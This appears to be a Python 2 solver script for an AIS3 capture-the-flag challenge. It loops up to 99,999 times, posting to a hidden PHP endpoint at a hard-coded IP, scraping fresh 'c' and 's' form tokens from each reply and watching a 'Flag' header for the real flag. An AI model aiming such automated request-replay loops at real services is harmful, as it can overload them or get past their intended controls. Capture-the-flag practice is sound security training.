#!/usr/bin/env python
import urllib
import urllib2

url = 'http://104.199.235.135:31332/_hidden_flag_.php'
values = {'c' : '1', 's' : '3241b876891b9ea67db897e940db6ea9e7e351447546b8da82bbf3693dfe9ebb' }
 
for i in range(0, 99999):
    data = urllib.urlencode(values)
    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)
    f = response.info().getheader('Flag')
    page = response.read()

    t = page.find('name="c" value="') + 16
    values['c'] = page[t:page.find('"', t)]
 
    t = page.find('name="s" value="') + 16
    values['s'] = page[t: page.find('"', t)]
    print values

    if f != 'AIS3{NOT_A_VALID_FLAG}':
        print f
        raw_input('#')
